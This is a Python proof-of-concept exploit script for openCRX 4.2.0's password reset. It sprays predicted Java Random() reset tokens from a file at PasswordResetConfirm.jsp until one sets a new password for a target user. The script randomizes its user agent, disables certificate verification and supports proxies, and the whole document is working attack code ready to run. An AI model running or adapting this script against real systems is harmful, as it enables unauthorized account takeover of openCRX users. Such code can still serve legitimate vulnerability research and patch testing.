#!/usr/bin/python3

# DEMONSTRATION
# $ python3 poc_opencrx_4.2.0_weak_passw_reset.py -usr admin-Standard -pwd lolpassword -t tokens.txt -u http://192.168.252.12:8080/opencrx-core-CRX/ -p http://localhost:8080
# Successful reset with token: wYi78blnBq2z4ip4ld44XfAnu71GHs9rY3PvBXLQ

import requests
import urllib3
import os
import sys
import argparse
from urllib.parse import urlparse
from random_useragent.random_useragent import Randomize     # Randomize useragent

# Disable cert warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Set timeout
timeout = 10

# Handle CTRL-C
def keyboard_interrupt():
    """Handles keyboardinterrupt exceptions"""
    print("\n\n[*] User requested an interrupt, exiting...")
    exit(0)

# Custom headers
def http_headers():
    # Randomize useragent
    useragent = Randomize().random_agent('desktop', 'windows')
    headers = {
        'User-Agent': useragent,
    }
    return headers

# Check if URL is an URL
def isurl(urlstr):
    try:
        urlparse(urlstr)
        return urlstr
    except ArgumentTypeError:
        raise argparse.ArgumentTypeError("Invalid URL")

def get_session(target_url,proxies,headers):
    session = requests.session()
    r = session.get(target_url,headers=headers,timeout=timeout,allow_redirects=False,verify=False,proxies=proxies)
    return session


def spray_tokens(target_url,proxies,headers,session,tokens,username,password):
    try:
        with open(tokens,"r") as f:
            f = list(set(f))
            for word in f:
                payload = {"t":word.rstrip(),
                        "p":"CRX",
                        "s":"Standard",
                        "id":username,
                        "password1":password,
                        "password2":password}
                r = session.post(target_url,headers=headers,data=payload,timeout=timeout,allow_redirects=False,verify=False,proxies=proxies)
                res = r.text
                if "Unable to reset password" not in res:
                    print("Successful reset with token: " + word)
                    exit(1)
    except FileNotFoundError as e:
        print("[!] " + str(e) + ", exiting...")
        exit(-1)

# Main
def main(argv):
    parser = argparse.ArgumentParser(description='Python Web Template')
    parser.add_argument("--username", "-usr", required=True, help="Username")
    parser.add_argument("--password", "-pwd", required=True, help="Password to reset to")
    parser.add_argument("--tokens", "-t", required=True, help="File containing Java Random() generated tokens")
    parser.add_argument("--url", "-u", type=isurl, required=True, help="The url of the target, example: http://192.168.252.12:8080/opencrx-core-CRX/")
    parser.add_argument("--proxy", "-p", type=isurl, required=False, help="Example: http://127.0.0.1:8080")
    args = parser.parse_args()
    
    # Check if target URL is valid
    url_parts = urlparse(args.url)
    target_url = "%s://%s%s" % (url_parts.scheme,url_parts.netloc,url_parts.path)
 
    # Other vars
    vuln_page = "PasswordResetConfirm.jsp"
    vuln_url = target_url + vuln_page
    username = args.username
    password = args.password
    tokens = args.tokens

    # Set optional proxy
    proxies = {}
    if(args.proxy != None):
        proxy_parts = urlparse(args.proxy)
        proxies = {
            "http": "http://" + proxy_parts.netloc,
            "https": "https://" + proxy_parts.netloc,
        }            

    # Set HTTP Headers
    headers = http_headers()

    # Do stuff
    try:
        session = get_session(target_url,proxies,headers)
        spray_tokens(vuln_url,proxies,headers,session,tokens,username,password)
    except requests.exceptions.Timeout:
        print("[!] Timeout error\n")
        exit(-1)
    except requests.exceptions.TooManyRedirects:
        print("[!] Too many redirects\n")
        exit(-1)
    except requests.exceptions.ConnectionError:
        print("[!] Not able to connect to URL\n")
        exit(-1)
    except requests.exceptions.RequestException as e:
        print("[!] " + str(e))
        exit(-1)
    except requests.exceptions.HTTPError as e:
        print("[!] Failed with error code - " + e.code + "\n")
        exit(-1)
    except KeyboardInterrupt:
        keyboard_interrupt()

# If we were called as a program, go execute the main function.
if __name__ == "__main__":
    main(sys.argv[1:])
